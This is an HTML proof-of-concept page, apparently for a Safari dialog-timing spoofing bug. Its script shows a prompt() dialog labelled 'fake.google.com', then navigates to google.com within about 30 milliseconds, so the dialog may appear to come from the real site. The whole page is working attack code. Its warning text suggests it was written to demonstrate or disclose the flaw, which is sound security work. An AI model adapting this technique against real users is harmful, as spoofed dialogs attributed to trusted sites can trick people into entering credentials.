<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Safari Dialog Timing PoC</title>
</head>
<body style="background:#000;color:#fff;font-family:sans-serif;text-align:center;">
<h3>Loading…</h3>

<script>
// Prepare WebKit lifecycle state
history.pushState({}, "", "#poc");
window.addEventListener("pagehide", () => {});
window.addEventListener("beforeunload", () => {});

// Let page settle VERY briefly
setTimeout(() => {

  // 1️⃣ Show dialog FIRST (this is key for Safari)
  try {
    prompt(
      "fake.google.com\n⚠️ Do not sign into your account",
      ""
    );
  } catch (e) {}

  // 2️⃣ Trigger navigation immediately after
  setTimeout(() => {
    location.href = "https://www.google.com";
  }, 30); // super tight window

}, 80);
</script>
</body>
</html>
